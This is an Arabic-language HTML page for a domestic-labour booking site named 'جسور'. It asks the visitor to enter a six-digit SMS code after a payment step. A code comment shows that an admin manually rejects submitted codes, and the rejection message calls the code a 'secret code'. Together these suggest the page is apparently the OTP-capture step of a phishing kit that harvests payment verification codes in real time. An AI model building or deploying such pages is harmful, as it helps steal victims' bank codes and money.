<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>رمز التحقق — جسور</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Tajawal', 'Arial', 'sans-serif'] },
                    colors: { brand: { DEFAULT: '#8B1A3A', dark: '#6B1230' } },
                },
            },
        };
    </script>
    <style>
        * { box-sizing: border-box; }
        html, body { min-height: 100%; overflow-x: hidden; }
        body { background: #f9fafb; font-family: 'Tajawal', Arial, sans-serif; -webkit-text-size-adjust: 100%; }
        .btn-gradient-continue {
            background: linear-gradient(90deg, #7b113a 0%, #1a1a40 100%);
            color: #ffffff;
            box-shadow: 0 4px 6px -1px rgba(0,0,0,.1);
            transition: background .2s ease;
        }
        .btn-gradient-continue:hover:not(:disabled) { background: linear-gradient(90deg, #6a0f32 0%, #151530 100%); }
        .btn-gradient-continue:disabled { opacity: 0.6; cursor: not-allowed; }
        .otp-single-input {
            width: 100%;
            height: 3.5rem;
            text-align: center;
            font-size: 1.6rem;
            font-weight: 700;
            letter-spacing: 0.5rem;
            border: 2px solid #e5e7eb;
            border-radius: 0.75rem;
            color: #111827;
            background: #fff;
            transition: border-color .2s, box-shadow .2s;
            outline: none;
            font-family: monospace;
            direction: ltr;
        }
        .otp-single-input:focus { border-color: #8B1A3A; box-shadow: 0 0 0 3px rgba(139,26,58,.12); }
        .otp-single-input.error { border-color: #dc2626; box-shadow: 0 0 0 3px rgba(220,38,38,.12); background: #fef2f2; }
    </style>
</head>
<body>

    <!-- Header -->
    <header style="position:sticky;top:0;z-index:40;border-bottom:1px solid #e5e7eb;background:rgba(255,255,255,0.95);backdrop-filter:blur(4px);">
        <div style="max-width:600px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:0.75rem 1rem;">
            <a href="/"><img src="/images/logo.png" alt="جسور" style="height:2.5rem;width:auto;"></a>
            <span style="font-size:0.875rem;color:#6b7280;">خدمات العمالة المنزلية</span>
        </div>
    </header>

    <!-- Progress Steps -->
    <div style="border-bottom:1px solid #f3f4f6;background:#fff;">
        <div style="max-width:600px;margin:0 auto;padding:0.75rem 1rem;">
            <ol style="display:flex;align-items:center;gap:0.5rem;font-size:0.8rem;flex-wrap:wrap;">
                <li style="display:flex;align-items:center;gap:0.375rem;color:#16a34a;font-weight:600;">
                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#dcfce7;font-size:0.7rem;font-weight:700;">✓</span>
                    تفاصيل الخدمة
                </li>
                <li style="color:#d1d5db;margin:0 0.25rem;">›</li>
                <li style="display:flex;align-items:center;gap:0.375rem;color:#16a34a;font-weight:600;">
                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#dcfce7;font-size:0.7rem;font-weight:700;">✓</span>
                    بيانات التواصل
                </li>
                <li style="color:#d1d5db;margin:0 0.25rem;">›</li>
                <li style="display:flex;align-items:center;gap:0.375rem;color:#16a34a;font-weight:600;">
                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#dcfce7;font-size:0.7rem;font-weight:700;">✓</span>
                    الدفع
                </li>
                <li style="color:#d1d5db;margin:0 0.25rem;">›</li>
                <li style="display:flex;align-items:center;gap:0.375rem;color:#8B1A3A;font-weight:700;">
                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#8B1A3A;font-size:0.7rem;font-weight:700;color:#fff;">4</span>
                    التأكيد
                </li>
            </ol>
        </div>
    </div>

    <!-- Main Content -->
    <main style="max-width:420px;margin:0 auto;padding:2.5rem 1rem 3rem;">

        <!-- Icon + Title -->
        <div style="text-align:center;margin-bottom:2rem;">
            <div style="margin:0 auto 1rem;display:flex;height:4rem;width:4rem;align-items:center;justify-content:center;border-radius:9999px;background:rgba(139,26,58,0.1);">
                <svg style="height:2rem;width:2rem;color:#8B1A3A;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 8.25h3m-3 3h3m-3 3h3" />
                </svg>
            </div>
            <h1 style="font-size:1.5rem;font-weight:700;color:#111827;margin:0 0 0.5rem;">رمز التحقق</h1>
            <p style="font-size:0.875rem;color:#6b7280;margin:0;">تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك</p>
        </div>

        <!-- Error Message -->
        <div id="error-msg" style="display:none;margin-bottom:1rem;border-radius:0.5rem;background:#fef2f2;border:1px solid #fecaca;padding:0.75rem 1rem;font-size:0.875rem;color:#b91c1c;text-align:center;"></div>

        <!-- Form -->
        <form method="post" action="/booking/otp" id="otpForm">
            <div style="margin-bottom:1.5rem;">
                <label style="display:block;font-size:0.875rem;font-weight:600;color:#374151;margin-bottom:0.5rem;text-align:center;">أدخل الرمز المكون من 6 أرقام</label>
                <input
                    type="text"
                    id="otpInput"
                    name="otp"
                    inputmode="numeric"
                    maxlength="6"
                    placeholder="● ● ● ● ● ●"
                    autocomplete="one-time-code"
                    class="otp-single-input"
                    oninput="this.value=this.value.replace(/\D/g,'');checkOtp()"
                >
            </div>

            <button type="submit" id="submitBtn"
                class="btn-gradient-continue"
                style="width:100%;border-radius:0.75rem;padding:1rem;font-size:1rem;font-weight:700;border:none;cursor:not-allowed;opacity:0.6;"
                disabled>
                <span id="btnText">تأكيد الرمز</span>
            </button>
        </form>

        <!-- Resend -->
        <div style="margin-top:1.5rem;text-align:center;" id="resendSection">
            <p style="font-size:0.875rem;color:#6b7280;" id="countdownText">
                يمكنك إعادة الإرسال بعد <span id="countdown" style="font-weight:700;color:#8B1A3A;">60</span> ثانية
            </p>
            <button id="resendBtn" onclick="resendOtp()"
                style="display:none;font-size:0.875rem;font-weight:600;color:#8B1A3A;background:none;border:none;cursor:pointer;text-decoration:underline;">
                إعادة إرسال الرمز
            </button>
            <p id="resendMsg" style="display:none;margin-top:0.5rem;font-size:0.875rem;color:#16a34a;"></p>
        </div>

    </main>

    <!-- Footer -->
    <footer style="background:#6B1230;color:#fff;">
        <div style="max-width:600px;margin:0 auto;padding:1.5rem 1rem;text-align:center;font-size:0.75rem;color:rgba(255,255,255,0.6);">
            جسور — جميع الحقوق محفوظة 2026 ©
        </div>
    </footer>

    <script>
        // Countdown timer
        let countdown = 60;
        const countdownEl = document.getElementById('countdown');
        const countdownText = document.getElementById('countdownText');
        const resendBtn = document.getElementById('resendBtn');

        const timer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            if (countdown <= 0) {
                clearInterval(timer);
                countdownText.style.display = 'none';
                resendBtn.style.display = 'inline';
            }
        }, 1000);

        function checkOtp() {
            const val = document.getElementById('otpInput').value;
            const btn = document.getElementById('submitBtn');
            if (val.length === 6) {
                btn.disabled = false;
                btn.style.cursor = 'pointer';
                btn.style.opacity = '1';
            } else {
                btn.disabled = true;
                btn.style.cursor = 'not-allowed';
                btn.style.opacity = '0.6';
            }
        }

        document.getElementById('otpForm').addEventListener('submit', function(e) {
            document.getElementById('btnText').textContent = 'جاري التحقق...';
            document.getElementById('submitBtn').disabled = true;
        });

        async function resendOtp() {
            resendBtn.disabled = true;
            resendBtn.textContent = 'جاري الإرسال...';
            try {
                const r = await fetch('/booking/otp/resend', { method: 'POST' });
                const d = await r.json();
                const msg = document.getElementById('resendMsg');
                msg.textContent = d.message || 'تم إرسال الرمز';
                msg.style.display = 'block';
                setTimeout(() => { msg.style.display = 'none'; }, 3000);
                resendBtn.style.display = 'none';
                countdownText.style.display = 'block';
                countdown = 60;
                countdownEl.textContent = 60;
                const t2 = setInterval(() => {
                    countdown--;
                    countdownEl.textContent = countdown;
                    if (countdown <= 0) {
                        clearInterval(t2);
                        countdownText.style.display = 'none';
                        resendBtn.style.display = 'inline';
                        resendBtn.disabled = false;
                        resendBtn.textContent = 'إعادة إرسال الرمز';
                    }
                }, 1000);
            } catch(err) {
                resendBtn.disabled = false;
                resendBtn.textContent = 'إعادة إرسال الرمز';
            }
        }

        // Check for error in URL
        const params = new URLSearchParams(window.location.search);
        const errorEl = document.getElementById('error-msg');
        const otpInput = document.getElementById('otpInput');

        if (params.get('error') === 'rejected') {
            // رفض من الادمين - مربع أحمر + رسالة
            errorEl.textContent = 'انتهت صلاحية الكود أو الرمز السري غير صالح';
            errorEl.style.display = 'block';
            otpInput.classList.add('error');
        } else if (params.get('error') === 'invalid') {
            errorEl.textContent = 'الرمز غير صحيح، يرجى المحاولة مرة أخرى';
            errorEl.style.display = 'block';
            otpInput.classList.add('error');
        } else if (params.get('error') === 'expired') {
            errorEl.textContent = 'انتهت صلاحية الرمز، يرجى طلب رمز جديد';
            errorEl.style.display = 'block';
            otpInput.classList.add('error');
        }
    </script>
</body>
</html>
